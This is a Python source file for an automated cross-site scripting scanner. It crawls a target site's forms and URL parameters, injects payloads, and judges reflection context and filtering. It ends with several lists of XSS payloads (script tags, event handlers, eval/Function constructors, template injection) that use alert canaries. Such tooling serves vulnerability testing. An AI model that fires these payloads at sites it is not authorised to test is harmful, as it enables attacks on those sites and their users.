import aiohttp
import logging
from bs4 import BeautifulSoup
from urllib.parse import urljoin, parse_qs, urlparse
import re
import time
import hashlib
import difflib
from typing import List, Dict
import random
import string
import html
import asyncio

logger = logging.getLogger(__name__)

class XSSScanner:
    def __init__(self):
        self.seen_responses = set()
        self.successful_payloads = set()
        self.max_workers = 5

    def generate_random_string(self, length: int = 8) -> str:
        """Generate a random string for testing"""
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

    def calculate_response_hash(self, response_text: str) -> str:
        """Calculate a normalized hash of the response"""
        # Remove common dynamic content
        normalized = re.sub(r'\b\d{10,}\b', '', response_text)
        normalized = re.sub(r'\b[a-f0-9]{32}\b', '', normalized)
        normalized = re.sub(r'\b\d{4}-\d{2}-\d{2}\b', '', normalized)
        return hashlib.md5(normalized.encode()).hexdigest()

    def analyze_response_pattern(self, response_text: str, payload: str) -> Dict:
        """Analyze response for XSS indicators"""
        analysis = {
            'length': len(response_text),
            'hash': self.calculate_response_hash(response_text),
            'payload_reflected': False,
            'context_detected': None,
            'filters_detected': [],
            'indicators': []
        }

        # Check for payload reflection
        escaped_payload = re.escape(payload)
        if re.search(escaped_payload, response_text, re.IGNORECASE):
            analysis['payload_reflected'] = True
            analysis['indicators'].append("Payload reflected in response")

        # Detect context
        if re.search(r'<script[^>]*>' + escaped_payload, response_text, re.IGNORECASE):
            analysis['context_detected'] = 'js_script'
            analysis['indicators'].append("Payload reflected within <script> tags")
        elif re.search(r'javascript:.*' + escaped_payload, response_text, re.IGNORECASE):
            analysis['context_detected'] = 'js_uri'
            analysis['indicators'].append("Payload reflected in JavaScript URI")
        elif re.search(r'on\w+\s*=.*' + escaped_payload, response_text, re.IGNORECASE):
            analysis['context_detected'] = 'js_event'
            analysis['indicators'].append("Payload reflected in event handler")
        elif re.search(r'<[^>]*' + escaped_payload, response_text, re.IGNORECASE):
            analysis['context_detected'] = 'html_attr'
            analysis['indicators'].append("Payload reflected in HTML attribute")
        elif re.search(r'<style[^>]*>' + escaped_payload, response_text, re.IGNORECASE):
            analysis['context_detected'] = 'css'
            analysis['indicators'].append("Payload reflected in CSS")

        # Detect common filters
        original_payload = html.unescape(payload)
        if payload != original_payload and original_payload in response_text:
            analysis['filters_detected'].append('html_encoding')
        if re.search(r'&(lt|gt|quot|apos|amp);', response_text):
            analysis['filters_detected'].append('html_entities')
        if '\\' + payload in response_text:
            analysis['filters_detected'].append('escaping')

        return analysis

    def compare_responses(self, original: str, injected: str) -> float:
        """Compare responses and return a similarity score"""
        return difflib.SequenceMatcher(None, original, injected).ratio()

    async def test_parameter(self, session: aiohttp.ClientSession, url: str, method: str, 
                           param_name: str, original_value: str, test_payloads: List[str],
                           other_params: Dict = None) -> List[Dict]:
        """Test a single parameter with multiple payloads"""
        vulnerabilities = []
        base_data = other_params or {}
        original_response = None

        try:
            if method.lower() == 'get':
                async with session.get(url, params={**base_data, param_name: original_value}, 
                                    ssl=False, timeout=10) as response:
                    original_response = await response.text()
            else:
                async with session.post(url, data={**base_data, param_name: original_value}, 
                                     ssl=False, timeout=10) as response:
                    original_response = await response.text()

            # Test each payload
            for payload in test_payloads:
                try:
                    # Generate unique identifier for this test
                    canary = self.generate_random_string()
                    test_value = payload.replace('[CANARY]', canary)
                    
                    # Send request with payload
                    start_time = time.time()
                    if method.lower() == 'get':
                        async with session.get(url, params={**base_data, param_name: test_value}, 
                                            ssl=False, timeout=10) as response:
                            response_text = await response.text()
                    else:
                        async with session.post(url, data={**base_data, param_name: test_value}, 
                                             ssl=False, timeout=10) as response:
                            response_text = await response.text()
                    
                    # Analyze response
                    analysis = self.analyze_response_pattern(response_text, test_value)
                    similarity = self.compare_responses(original_response, response_text)

                    # Check for successful XSS
                    is_vulnerable = False
                    evidence = []
                    
                    if analysis['payload_reflected']:
                        evidence.append("Payload was reflected in the response")
                        if analysis['context_detected']:
                            evidence.append(f"Detected in {analysis['context_detected']} context")
                            if analysis['context_detected'] in ['js_script', 'js_uri', 'js_event']:
                                is_vulnerable = True
                        elif not analysis['filters_detected']:
                            is_vulnerable = True
                            evidence.append("No security filters detected")
                        
                        if analysis['filters_detected']:
                            evidence.append(f"Filters detected: {', '.join(analysis['filters_detected'])}")
                            if 'html_encoding' in analysis['filters_detected'] and 'js_script' in payload:
                                is_vulnerable = True
                                evidence.append("HTML encoding bypass possible with JavaScript payload")

                    if is_vulnerable:
                        self.successful_payloads.add(payload)
                        vulnerabilities.append({
                            "type": "Cross-Site Scripting (XSS)",
                            "description": f"XSS vulnerability detected in {param_name} parameter",
                            "location": url,
                            "severity": "high",
                            "payload": html.escape(test_value),  # Escape the payload for display
                            "method": method.upper(),
                            "parameter": param_name,
                            "evidence": evidence,
                            "details": {
                                "request": {
                                    "method": method.upper(),
                                    "url": url,
                                    "tested_param": param_name,
                                    "payload": html.escape(test_value)  # Escape the payload for display
                                },
                                "response": {
                                    "context": analysis['context_detected'],
                                    "filters": analysis['filters_detected'],
                                    "similarity": f"{similarity:.2f}",
                                    "analysis": analysis,
                                    "evidence": [html.escape(e) if '<' in e or '>' in e else e for e in evidence]  # Escape evidence if it contains HTML
                                }
                            }
                        })

                except Exception as e:
                    logger.error(f"Error testing payload {html.escape(payload)} on {param_name}: {str(e)}")
                    continue

        except Exception as e:
            logger.error(f"Error getting original response: {str(e)}")

        return vulnerabilities

    async def scan_url(self, url: str) -> List[Dict]:
        """Main scanning function"""
        all_vulnerabilities = []
        try:
            async with aiohttp.ClientSession(headers=CUSTOM_HEADERS) as session:
                # First, crawl the site to find all forms and parameters
                forms = await self.crawl_site(session, url)
                logger.info(f"Found {len(forms)} forms to test")

                # Prepare all test cases
                test_cases = []
                
                # Add URL parameters
                parsed_url = urlparse(url)
                if parsed_url.query:
                    params = parse_qs(parsed_url.query)
                    base_url = url.split('?')[0]
                    for param_name, values in params.items():
                        test_cases.append({
                            'url': base_url,
                            'method': 'get',
                            'param_name': param_name,
                            'original_value': values[0],
                            'other_params': {k: v[0] for k, v in params.items() if k != param_name}
                        })

                # Add form parameters
                for form in forms:
                    for input_name in form['inputs']:
                        test_cases.append({
                            'url': form['action'],
                            'method': form['method'],
                            'param_name': input_name,
                            'original_value': 'test',
                            'other_params': {name: 'test' for name in form['inputs'] if name != input_name}
                        })

                # Test each case with different payload sets
                tasks = []
                for case in test_cases:
                    for payload_set in [BASIC_PAYLOADS, ATTRIBUTE_PAYLOADS, EVENT_PAYLOADS, 
                                      JAVASCRIPT_PAYLOADS, TEMPLATE_PAYLOADS]:
                        task = self.test_parameter(
                            session=session,
                            url=case['url'],
                            method=case['method'],
                            param_name=case['param_name'],
                            original_value=case['original_value'],
                            test_payloads=payload_set,
                            other_params=case['other_params']
                        )
                        tasks.append(task)

                # Run all tests concurrently
                results = await asyncio.gather(*tasks, return_exceptions=True)
                
                # Collect results
                for result in results:
                    if isinstance(result, list):
                        all_vulnerabilities.extend(result)

        except Exception as e:
            logger.error(f"Error during scan: {str(e)}")
            return [{
                "type": "Scan Error",
                "description": f"Error during scan: {str(e)}",
                "location": url,
                "severity": "error"
            }]

        return all_vulnerabilities

    async def crawl_site(self, session: aiohttp.ClientSession, url: str) -> List[Dict]:
        """Crawl the site to find all forms and parameters"""
        forms = []
        try:
            async with session.get(url, ssl=False, timeout=10) as response:
                if response.status != 200:
                    logger.error(f"Failed to fetch {url}. Status code: {response.status}")
                    return forms
                
                text = await response.text()
                soup = BeautifulSoup(text, 'html.parser')
                
                # Find all forms
                for form in soup.find_all('form'):
                    form_data = {
                        'action': urljoin(url, form.get('action', '')),
                        'method': form.get('method', 'get').lower(),
                        'inputs': []
                    }
                    
                    # Get all input fields
                    for input_tag in form.find_all(['input', 'textarea']):
                        input_type = input_tag.get('type', '')
                        input_name = input_tag.get('name')
                        if input_type not in ['submit', 'button', 'image', 'reset', 'file'] and input_name:
                            form_data['inputs'].append(input_name)
                    
                    # Add form if it has inputs
                    if form_data['inputs']:
                        forms.append(form_data)
                        logger.info(f"Found form at {form_data['action']} with inputs: {form_data['inputs']}")
                
        except Exception as e:
            logger.error(f"Error crawling {url}: {str(e)}")
            
        return forms

async def scan(target_url: str) -> List[Dict]:
    """Entry point for the scanner"""
    scanner = XSSScanner()
    return await scanner.scan_url(target_url)

# Constants and Configurations
CUSTOM_HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1'
}

# Sophisticated XSS payload sets
BASIC_PAYLOADS = [
    "<script>alert('[CANARY]')</script>",
    "<img src=x onerror=alert('[CANARY]')>",
    "<svg onload=alert('[CANARY]')>",
    "javascript:alert('[CANARY]')",
    "<[CANARY]>",
    "'><script>alert('[CANARY]')</script>",
    "\"><script>alert('[CANARY]')</script>",
]

ATTRIBUTE_PAYLOADS = [
    "\" onmouseover=\"alert('[CANARY]')\" \"",
    "' onmouseover='alert([CANARY])' '",
    "\" onload=\"alert('[CANARY]')\" \"",
    "' onload='alert([CANARY])' '",
    "\" onerror=\"alert('[CANARY]')\" \"",
    "' onerror='alert([CANARY])' '",
]

EVENT_PAYLOADS = [
    "onmouseover=alert('[CANARY]')",
    "onload=alert('[CANARY]')",
    "onerror=alert('[CANARY]')",
    "onfocus=alert('[CANARY]')",
    "onclick=alert('[CANARY]')",
    "onmouseenter=alert('[CANARY]')",
]

JAVASCRIPT_PAYLOADS = [
    "<script>eval(atob('[CANARY]'))</script>",
    "<script>setTimeout('alert([CANARY])',0)</script>",
    "<script>setInterval('alert([CANARY])',0)</script>",
    "<script>Function('alert([CANARY])')();</script>",
    "<script>[].constructor.constructor('alert([CANARY])')();</script>",
]

TEMPLATE_PAYLOADS = [
    "${alert('[CANARY]')}",
    "{{constructor.constructor('alert([CANARY])')()}}",
    "{{[CANARY]}}",
    "${alert`[CANARY]`}",
    "<%=alert('[CANARY]')%>",
]
